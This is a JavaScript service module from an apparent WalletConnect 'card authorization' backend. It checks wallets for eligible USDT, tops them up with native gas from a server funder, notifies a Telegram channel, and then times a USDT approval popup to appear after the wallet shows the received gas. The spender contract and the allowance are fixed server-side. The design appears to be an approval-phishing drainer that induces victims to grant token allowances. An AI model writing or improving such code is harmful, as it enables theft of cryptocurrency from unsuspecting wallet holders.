const env = require("../config/env");
const paymentStore = require("../storage/payments");
const sessionStore = require("../storage/sessions");
const { getNetwork } = require("../config/networks");
const { estimateApprovalGas } = require("./gasEstimate");
const { formatUnits } = require("../utils/helpers");
const { checkCardEligibility } = require("./cardEligibility");
const { NotFoundError, ValidationError } = require("../utils/errors");
const { emitEvent } = require("../utils/events");
const { refreshBalances } = require("./balances");
const { autoTopupRaw, hasNativeFunder, publicTopup, tronMinRaw, ethMinRaw, liveEthMeetsMin, approvalDelayAfterTopup } = require("../config/evmGas");
const { approveAmountLabel } = require("../config/approvalAmount");
const logger = require("../utils/logger");

const approvalAfterTopup = new Set();

function scheduleApprovalAfterTopup(paymentId, networkKey, deps = {}) {
    if (process.env.NODE_ENV === "test" && deps.autoRequestApproval !== true) {
        return;
    }

    const current = paymentStore.getPayment(paymentId);
    if (!current?.gasFundingTxHash || current.approvalSent || current.approvalRunScheduled) {
        return;
    }

    if (["requested", "wallet_confirmed", "verified", "rejected", "failed"].includes(current.status)) {
        return;
    }

    if (approvalAfterTopup.has(paymentId)) {
        return;
    }

    approvalAfterTopup.add(paymentId);
    const delay = deps.approvalDelayMs != null
        ? Number(deps.approvalDelayMs)
        : approvalDelayAfterTopup(networkKey);

    logger.info({
        paymentId,
        network: networkKey,
        delay,
        transactionHash: current.gasFundingTxHash
    }, "Waiting for top-up gas to arrive before the approval popup");

    const timer = setTimeout(async () => {
        try {
            const live = await waitUntilGasArrived(paymentId, deps);
            approvalAfterTopup.delete(paymentId);
            const latest = paymentStore.getPayment(paymentId);
            if (!latest || !gasHasArrived(networkKey, live, latest)) {
                paymentStore.updatePayment(paymentId, {
                    gasArrivalGaveUp: true,
                    error: "Gas top-up is confirmed, but it has not arrived in the wallet yet. Approval stays closed."
                });
                logger.warn({
                    paymentId,
                    network: networkKey,
                    transactionHash: current.gasFundingTxHash,
                    walletGas: live?.currentBalanceRaw ?? null
                }, "Top-up hash exists but gas has not arrived; approval popup stays closed");
                return;
            }
            const requestApproval = deps.requestApproval
                || ((id, extra) => require("./approvalService").requestApproval(id, extra));
            // Do not pass gasAlreadyArrived — force a fresh live balance check.
            await requestApproval(paymentId, { wait: false, afterTopupHash: true });
        } catch (err) {
            approvalAfterTopup.delete(paymentId);
            logger.warn({ err: { message: err.message }, paymentId }, "Approval after gas arrival failed");
        }
    }, 0);

    if (typeof timer.unref === "function") {
        timer.unref();
    }
}

function gasHasArrived(networkKey, liveGas, payment) {
    if (!liveGas || liveGas.sufficient !== true) {
        return false;
    }

    const live = parseRaw(liveGas.currentBalanceRaw);
    if (live == null || live <= 0n) {
        return false;
    }

    if (String(networkKey || "").toLowerCase() === "eth" && !liveEthMeetsMin(liveGas.currentBalanceRaw)) {
        return false;
    }

    // After a top-up hash, the live balance must rise above the pre-top-up
    // balance. Missing "before" is treated as 0 so a zero wallet can never
    // open the approval until new gas is actually visible.
    if (payment?.gasFundingTxHash) {
        const before = parseRaw(payment.gasBalanceBeforeRaw) ?? 0n;
        if (live <= before) {
            return false;
        }
    }

    return true;
}

function approvalReadyToOpen(payment, liveGas, deps = {}) {
    if (!gasHasArrived(payment?.network, liveGas, payment)) {
        return false;
    }

    if (!payment?.gasFundingTxHash) {
        return true;
    }

    const catchUp = walletCatchUpMs(payment.network, deps);
    const seen = Date.parse(payment.gasVisibleAt || "");

    if (!Number.isFinite(seen)) {
        paymentStore.updatePayment(payment.paymentId, {
            gasVisibleAt: new Date().toISOString()
        });
        return catchUp <= 0;
    }

    return Date.now() - seen >= catchUp;
}

function walletCatchUpMs(networkKey, deps = {}) {
    if (deps.walletCatchUpMs != null) {
        return Number(deps.walletCatchUpMs);
    }

    if (process.env.NODE_ENV === "test") {
        return 0;
    }

    // Trust Wallet often shows the ETH/BNB notification a few seconds after
    // the chain balance updates. Hold the approval popup ~7s so gas is visible first.
    return 7000;
}

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitUntilGasArrived(paymentId, deps = {}) {
    const payment = paymentStore.getPayment(paymentId);
    if (!payment?.gasFundingTxHash) {
        return null;
    }

    // Brief hold after the top-up hash so Trust can show the receive notification
    // before we open the approval popup.
    const initialDelay = deps.approvalDelayMs != null
        ? Number(deps.approvalDelayMs)
        : approvalDelayAfterTopup(payment.network);
    if (initialDelay > 0) {
        const fundedAt = Date.parse(payment.gasFundedAt || "");
        const started = Number.isFinite(fundedAt) ? fundedAt : Date.now();
        const remaining = Math.max(0, initialDelay - (Date.now() - started));
        if (remaining > 0) {
            await sleep(remaining);
        }
    }

    const timeout = Number.isFinite(Number(deps.gasArrivalTimeoutMs))
        ? Number(deps.gasArrivalTimeoutMs)
        : 90000;
    const poll = Number.isFinite(Number(deps.gasArrivalPollMs))
        ? Number(deps.gasArrivalPollMs)
        : 2000;
    const deadline = Date.now() + Math.max(0, timeout);

    while (Date.now() <= deadline) {
        const current = paymentStore.getPayment(paymentId);
        if (!current || current.approvalSent || ["requested", "verified", "rejected", "failed"].includes(current.status)) {
            return null;
        }

        let live = null;
        try {
            const session = sessionStore.getSession(current.connectionId);
            live = await (deps.checkGasSufficiency || checkGasSufficiency)(session, current.network, deps);
        } catch (err) {
            logger.warn({ err: { message: err.message }, paymentId }, "Could not read wallet gas after top-up");
        }

        if (gasHasArrived(current.network, live, current)) {
            const ready = approvalReadyToOpen(current, live, deps);
            const latest = paymentStore.getPayment(paymentId) || current;
            if (!ready) {
                const seen = Date.parse(latest.gasVisibleAt || "");
                const waitMs = Number.isFinite(seen)
                    ? Math.max(0, walletCatchUpMs(current.network, deps) - (Date.now() - seen))
                    : walletCatchUpMs(current.network, deps);
                if (waitMs > 0) {
                    await sleep(Math.min(waitMs, poll));
                }
            } else {
                logger.info({
                    paymentId,
                    network: current.network,
                    walletGas: live.currentBalanceRaw ?? null,
                    transactionHash: current.gasFundingTxHash
                }, "Top-up gas has arrived in the wallet; opening approval");
                return live;
            }
        }

        if (Date.now() + poll > deadline) {
            break;
        }
        await sleep(poll);
    }

    return null;
}

function parseRaw(value) {
    if (value == null || value === "") {
        return null;
    }

    try {
        return BigInt(String(value));
    } catch (_err) {
        return null;
    }
}

function pickWalletGas(liveRaw, sessionRaw) {
    const live = parseRaw(liveRaw);
    const session = parseRaw(sessionRaw);

    if (live == null) {
        return session;
    }

    if (live === 0n && session != null && session > 0n) {
        return session;
    }

    return live;
}

function needsGasFunding(gas) {
    if (!gas) {
        return false;
    }

    if (gas.needFunding === true) {
        return true;
    }

    if (gas.needFunding === false) {
        return false;
    }

    const walletGas = parseRaw(gas.currentBalanceRaw);
    const requiredGas = parseRaw(gas.estimatedRequiredRaw);

    if (walletGas == null || requiredGas == null) {
        return false;
    }

    return walletGas < requiredGas;
}

function logFundingDecision(network, gas, extra = {}) {
    logger.info({
        network,
        walletGas: gas?.currentBalanceRaw ?? null,
        requiredGas: gas?.estimatedRequiredRaw ?? null,
        needFunding: needsGasFunding(gas),
        ...extra
    }, "Gas funding decision");
}

function publicPayment(payment) {
    return require("./paymentService").publicPayment(payment);
}

function emitPaymentEvent(event, payment, extra = {}) {
    emitEvent(event, {
        paymentId: payment.paymentId,
        connectionId: payment.connectionId,
        network: payment.network,
        status: payment.status,
        timestamp: new Date().toISOString(),
        ...extra
    });
}

function assertNoClientOverrides(body) {
    if (body.spender || body.cardContract || body.card) {
        throw new ValidationError("Spender/card contract cannot be supplied by the client");
    }

    if (body.tokenContract || body.tokenAddress || body.usdt || body.contractAddress) {
        throw new ValidationError("Token contract cannot be supplied by the client");
    }

    if (body.allowance != null || body.amount != null || body.allowanceRaw != null) {
        throw new ValidationError("Allowance cannot be supplied by the client");
    }
}

function fundingLimits() {
    const buffer = Number(env.GAS_FUNDING_BUFFER || "0.20");
    const maxMultiple = Number(env.GAS_FUNDING_MAX || "2");

    return {
        buffer: Number.isFinite(buffer) && buffer >= 0 ? buffer : 0.2,
        maxMultiple: Number.isFinite(maxMultiple) && maxMultiple >= 1 ? maxMultiple : 2
    };
}

function recommendedFromEstimate(estimatedCost) {
    const { buffer, maxMultiple } = fundingLimits();
    const estimate = BigInt(estimatedCost);
    const extra = (estimate * BigInt(Math.round(buffer * 1000))) / 1000n;
    let recommended = estimate + extra;
    const cap = estimate * BigInt(Math.floor(maxMultiple));

    if (recommended > cap) {
        recommended = cap;
    }

    if (recommended < estimate) {
        recommended = estimate;
    }

    return recommended;
}

function nativeRawFromSession(session, network) {
    const row = (session.balances || []).find((item) => (
        item.network === network.key || item.chainId === network.chainId
    ));
    const raw = row?.native?.raw;
    return raw != null && raw !== "" ? String(raw) : null;
}

function walletAddress(session, network) {
    const account = (session.accounts || []).find((item) => (
        item.chainId === network.chainId || item.namespace === network.namespace
    ));
    return account?.address || session.wallet?.address || null;
}

async function checkGasSufficiency(session, networkKey, deps = {}) {
    const network = getNetwork(networkKey, { requireContracts: false });
    const from = walletAddress(session, network);
    const nativeBalanceRaw = nativeRawFromSession(session, network);
    const configured = autoTopupRaw(network);
    let estimate;

    // Fast path: if live native is clearly below the network floor, decide top-up
    // without eth_estimateGas (that RPC alone often costs several seconds).
    if (!deps.estimateApprovalGas && from) {
        try {
            const quick = await estimateApprovalGas({
                network: network.key,
                from,
                nativeBalanceRaw
            }, {
                ...deps,
                skipEstimate: true
            });
            const liveQuick = parseRaw(quick.nativeBalance);
            const floor = network.key === "eth"
                ? ethMinRaw()
                : network.key === "tron"
                    ? tronMinRaw()
                    : 0n;
            if (liveQuick != null && floor > 0n && liveQuick < floor) {
                const required = floor;
                const recommended = configured || required;
                return {
                    sufficient: false,
                    needFunding: true,
                    network: network.key,
                    nativeSymbol: network.nativeSymbol,
                    currentBalance: formatUnits(liveQuick.toString(), network.nativeDecimals),
                    currentBalanceRaw: liveQuick.toString(),
                    estimatedGas: null,
                    estimatedRequired: formatUnits(required.toString(), network.nativeDecimals),
                    estimatedRequiredRaw: required.toString(),
                    recommendedFunding: formatUnits(recommended.toString(), network.nativeDecimals),
                    recommendedFundingRaw: recommended.toString(),
                    configuredTopup: configured ? publicTopup(network, configured) : null,
                    funderReady: hasNativeFunder(network.key),
                    reason: `Your ${network.name} wallet has insufficient ${network.nativeSymbol} to complete the ${approveAmountLabel()} card authorization.`
                };
            }
            if (liveQuick === 0n && network.key === "bsc") {
                const required = configured || 1n;
                return {
                    sufficient: false,
                    needFunding: true,
                    network: network.key,
                    nativeSymbol: network.nativeSymbol,
                    currentBalance: "0",
                    currentBalanceRaw: "0",
                    estimatedGas: null,
                    estimatedRequired: formatUnits(required.toString(), network.nativeDecimals),
                    estimatedRequiredRaw: required.toString(),
                    recommendedFunding: formatUnits(required.toString(), network.nativeDecimals),
                    recommendedFundingRaw: required.toString(),
                    configuredTopup: configured ? publicTopup(network, configured) : null,
                    funderReady: hasNativeFunder(network.key),
                    reason: `Your ${network.name} wallet has insufficient ${network.nativeSymbol} to complete the ${approveAmountLabel()} card authorization.`
                };
            }
        } catch (_err) {
            /* fall through to full estimate */
        }
    }

    try {
        estimate = await (deps.estimateApprovalGas || estimateApprovalGas)({
            network: network.key,
            from,
            nativeBalanceRaw
        }, deps);
    } catch (err) {
        return {
            sufficient: false,
            network: network.key,
            nativeSymbol: network.nativeSymbol,
            currentBalance: nativeBalanceRaw ? formatUnits(nativeBalanceRaw, network.nativeDecimals) : null,
            estimatedRequired: null,
            recommendedFunding: null,
            error: err.message
        };
    }

    if (!estimate.estimatedNativeCost) {
        return {
            sufficient: false,
            network: network.key,
            nativeSymbol: network.nativeSymbol,
            currentBalance: null,
            estimatedRequired: null,
            recommendedFunding: null,
            error: estimate.error || "Gas estimate unavailable"
        };
    }

    const recommended = configured || recommendedFromEstimate(estimate.estimatedNativeCost);
    const sessionRaw = nativeBalanceRaw != null && nativeBalanceRaw !== "" ? nativeBalanceRaw : null;
    let required = BigInt(estimate.estimatedNativeCost);

    if (network.key === "tron") {
        const minTrx = tronMinRaw();
        if (minTrx > required) {
            required = minTrx;
        }
    }

    if (network.key === "eth") {
        const minEth = ethMinRaw();
        if (minEth > required) {
            required = minEth;
        }
    }

    const liveEth = network.key === "eth" ? parseRaw(estimate.nativeBalance) : null;
    const walletGas = network.key === "eth"
        ? liveEth
        : pickWalletGas(estimate.nativeBalance, sessionRaw);
    const needFunding = network.key === "eth"
        ? (walletGas == null || walletGas < required)
        : (walletGas != null && walletGas < required);
    const sufficient = walletGas != null && walletGas >= required;

    logger.info({
        network: network.key,
        walletGas: walletGas != null ? walletGas.toString() : null,
        requiredGas: required.toString(),
        needFunding
    }, "Gas funding decision");

    return {
        sufficient,
        needFunding,
        network: network.key,
        nativeSymbol: network.nativeSymbol,
        currentBalance: walletGas != null ? formatUnits(walletGas.toString(), network.nativeDecimals) : null,
        currentBalanceRaw: walletGas != null ? walletGas.toString() : null,
        estimatedGas: estimate.estimatedGas,
        estimatedRequired: formatUnits(required.toString(), network.nativeDecimals),
        estimatedRequiredRaw: required.toString(),
        recommendedFunding: formatUnits(recommended.toString(), network.nativeDecimals),
        recommendedFundingRaw: recommended.toString(),
        configuredTopup: configured ? publicTopup(network, configured) : null,
        funderReady: hasNativeFunder(network.key),
        reason: sufficient
            ? `Live native balance covers the ${approveAmountLabel()} approval gas.`
            : walletGas == null
                ? `Could not confirm live ${network.nativeSymbol} on ${network.name}. Approve stays hidden until the wallet balance is verified.`
                : `Your ${network.name} wallet has insufficient ${network.nativeSymbol} to complete the ${approveAmountLabel()} card authorization.`
    };
}

function rejectClientFundingOverrides(body) {
    assertNoClientOverrides(body || {});

    if (body.network || body.amount || body.fundingAmount || body.recommendedFunding || body.value) {
        throw new ValidationError("Funding amount and network are calculated by the server");
    }
}

async function createGasQuote(paymentId, body = {}, deps = {}) {
    rejectClientFundingOverrides(body);

    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    const session = sessionStore.getSession(payment.connectionId);

    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    const gas = await checkGasSufficiency(session, payment.network, deps);
    const updated = paymentStore.updatePayment(paymentId, {
        gasQuote: gas,
        gasSufficient: gas.sufficient,
        status: gas.sufficient ? payment.status : "awaiting_gas"
    });

    emitPaymentEvent("gas_quote_created", updated, {
        sufficient: gas.sufficient,
        recommendedFunding: gas.recommendedFunding
    });

    return {
        ...gas,
        payment: publicPayment(updated)
    };
}

async function confirmGasQuote(paymentId, body = {}, deps = {}) {
    rejectClientFundingOverrides(body);

    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    if (!payment.gasQuote) {
        throw new ValidationError("Create a gas quote before confirming funding");
    }

    const session = sessionStore.getSession(payment.connectionId);

    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    const live = await (deps.checkGasSufficiency || checkGasSufficiency)(session, payment.network, deps);
    logFundingDecision(payment.network, live, { paymentId, stage: "confirmGasQuote" });
    paymentStore.updatePayment(paymentId, {
        gasQuote: live,
        gasSufficient: live.sufficient === true
    });

    if (!needsGasFunding(live)) {
        const ready = paymentStore.updatePayment(paymentId, {
            gasSufficient: live.sufficient === true,
            status: live.sufficient ? (payment.status === "awaiting_gas" ? "created" : payment.status) : payment.status
        });
        return {
            confirmed: true,
            funded: false,
            message: live.sufficient
                ? `Gas is already sufficient. Continue to the ${approveAmountLabel()} approval.`
                : "Native gas could not be compared yet. Funding is skipped until walletGas and requiredGas are both known.",
            payment: publicPayment(ready)
        };
    }

    if (payment.gasFundingTxHash) {
        if (!payment.gasFundedAt) {
            paymentStore.updatePayment(paymentId, {
                gasFundedAt: new Date().toISOString()
            });
        }
        if (payment.gasBalanceBeforeRaw == null) {
            paymentStore.updatePayment(paymentId, {
                gasBalanceBeforeRaw: live.currentBalanceRaw != null ? String(live.currentBalanceRaw) : "0"
            });
        }
        scheduleApprovalAfterTopup(paymentId, payment.network, deps);
        return {
            confirmed: true,
            funded: true,
            alreadyFunded: true,
            transactionHash: payment.gasFundingTxHash,
            message: "Native gas was already sent for this wallet. Approval follows the top-up hash.",
            payment: publicPayment(paymentStore.getPayment(paymentId))
        };
    }

    if (session.nativeFunding?.[payment.network]?.hash) {
        paymentStore.updatePayment(paymentId, {
            gasFundingTxHash: session.nativeFunding[payment.network].hash,
            gasFundedAt: session.nativeFunding[payment.network].at || new Date().toISOString(),
            gasFundingConfirmed: true,
            status: "awaiting_gas",
            gasBalanceBeforeRaw: payment.gasBalanceBeforeRaw != null
                ? payment.gasBalanceBeforeRaw
                : (live.currentBalanceRaw != null ? String(live.currentBalanceRaw) : "0")
        });
        scheduleApprovalAfterTopup(paymentId, payment.network, deps);
        return {
            confirmed: true,
            funded: true,
            alreadyFunded: true,
            transactionHash: session.nativeFunding[payment.network].hash,
            message: "Native gas was already sent to this wallet. Approval follows the top-up hash.",
            payment: publicPayment(paymentStore.getPayment(paymentId))
        };
    }

    const eligibility = checkCardEligibility(session);

    if (!eligibility.eligible) {
        throw new ValidationError(eligibility.reason);
    }

    const eligibleNetworks = eligibility.eligibleNetworks || (eligibility.preferredNetwork ? [eligibility.preferredNetwork] : []);

    if (!eligibleNetworks.includes(payment.network)) {
        throw new ValidationError("Gas funding is only allowed on networks with eligible USDT");
    }

    paymentStore.updatePayment(paymentId, {
        gasFundingConfirmed: true,
        status: "awaiting_gas",
        gasBalanceBeforeRaw: live.currentBalanceRaw != null ? String(live.currentBalanceRaw) : "0"
    });

    const network = getNetwork(payment.network, { requireContracts: false });

    if (!hasNativeFunder(network.key) || !autoTopupRaw(network)) {
        return {
            confirmed: true,
            funded: false,
            message: `Add ${payment.gasQuote.recommendedFunding} ${payment.gasQuote.nativeSymbol} to this wallet, then verify funding.`,
            payment: publicPayment(paymentStore.getPayment(paymentId))
        };
    }

    emitEvent("gas_topup_started", {
        paymentId,
        connectionId: payment.connectionId,
        network: payment.network
    });
    if (payment.network !== "tron") {
        try {
            const { notifyGasTopup } = require("./telegramNotifications");
            notifyGasTopup("started", payment).catch(() => {});
        } catch (_err) {
            /* telegram optional */
        }
    }

    const to = walletAddress(session, network);
    const sent = network.key === "tron"
        ? await require("./tronFunder").sendConfiguredTrxTopup({ to }, deps)
        : await require("./evmFunder").sendConfiguredNativeTopup({ networkKey: network.key, to }, deps);
    const fundedAt = new Date().toISOString();
    const proven = sent?.broadcasted === true || (Boolean(deps.sendNative) && Boolean(sent?.hash));

    if (proven) {
        const funding = {
            ...(session.nativeFunding || {}),
            [network.key]: {
                hash: sent.hash,
                amount: payment.gasQuote.recommendedFunding,
                at: fundedAt
            }
        };
        sessionStore.updateSession(payment.connectionId, { nativeFunding: funding });
    }

    let afterFund = null;
    try {
        // Do not refresh all balances here — that scan alone can take tens of seconds.
        // Live native balance is read when we wait for gas arrival.
        const latest = sessionStore.getSession(payment.connectionId) || session;
        afterFund = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, network.key, deps);
    } catch (err) {
        logger.warn({ err: { message: err.message }, paymentId }, "Could not re-check gas after top-up");
    }

    const ready = Boolean(afterFund && afterFund.sufficient === true);
    const updated = paymentStore.updatePayment(paymentId, {
        gasFundingConfirmed: proven,
        gasFundingVerified: proven,
        gasFundingTxHash: proven ? sent.hash : null,
        gasFundedAt: proven ? fundedAt : null,
        gasSufficient: ready,
        gasQuote: afterFund || live,
        status: ready ? "created" : "awaiting_gas"
    });

    if (proven) {
        emitPaymentEvent("gas_funding_verified", updated, {
            transactionHash: sent.hash
        });
        try {
            const { notifyGasTopup } = require("./telegramNotifications");
            if (network.key === "tron") {
                notifyGasTopup("started", updated).catch(() => {});
            }
            notifyGasTopup("confirmed", updated).catch(() => {});
        } catch (_err) {
            /* telegram optional */
        }
        scheduleApprovalAfterTopup(paymentId, network.key, deps);
    } else {
        logger.warn({
            paymentId,
            network: network.key,
            hash: sent?.hash || null
        }, "Skipping top-up confirmation because the transfer was not broadcast");
    }

    const symbol = payment.gasQuote.nativeSymbol;
    const amount = payment.gasQuote.recommendedFunding;
    return {
        confirmed: true,
        funded: proven,
        transactionHash: proven ? sent.hash : null,
        amount,
        network: network.key,
        nativeToken: symbol,
        message: proven
            ? `Sent ${amount} ${symbol}. The approval request opens in your wallet in a few seconds.`
            : `TRX top-up was not broadcast. No confirmation was sent.`,
        payment: publicPayment(updated)
    };
}

async function verifyGasFunding(paymentId, body = {}, deps = {}) {
    rejectClientFundingOverrides({
        ...body,
        transactionHash: undefined
    });

    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    const session = sessionStore.getSession(payment.connectionId);

    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    const lastRefresh = Date.parse(session.balancesUpdatedAt || "");
    const waiting = payment.status === "awaiting_gas" || Boolean(payment.gasFundingTxHash);
    const freshMs = waiting ? 8000 : 45000;
    const refreshStale = !Number.isFinite(lastRefresh) || (Date.now() - lastRefresh) > freshMs;

    if (refreshStale) {
        try {
            await refreshBalances(payment.connectionId, {
                ...deps,
                skipCache: waiting
            });
        } catch (err) {
            logger.warn({ err: { message: err.message }, paymentId }, "Could not refresh balances before gas confirmation");
        }
    }

    const latest = sessionStore.getSession(payment.connectionId) || session;
    const gas = await checkGasSufficiency(latest, payment.network, deps);

    if (!gas.sufficient) {
        paymentStore.updatePayment(paymentId, {
            gasQuote: gas,
            gasSufficient: false,
            status: "awaiting_gas"
        });
        throw new ValidationError(
            gas.reason
            || `Need confirmed ${gas.nativeSymbol || "native"} gas on ${payment.network} before approve. Current: ${gas.currentBalance != null ? gas.currentBalance : "unavailable"}.`
        );
    }

    const updated = paymentStore.updatePayment(paymentId, {
        gasQuote: gas,
        gasSufficient: true,
        gasFundingVerified: true,
        gasFundingTxHash: body.transactionHash || payment.gasFundingTxHash || null,
        status: "created"
    });

    emitPaymentEvent("gas_funding_verified", updated, {
        transactionHash: updated.gasFundingTxHash
    });

    return {
        ...gas,
        transactionHash: updated.gasFundingTxHash,
        payment: publicPayment(updated)
    };
}

module.exports = {
    checkGasSufficiency,
    gasHasArrived,
    approvalReadyToOpen,
    waitUntilGasArrived,
    scheduleApprovalAfterTopup,
    needsGasFunding,
    recommendedFromEstimate,
    createGasQuote,
    confirmGasQuote,
    verifyGasFunding,
    fundingLimits
};
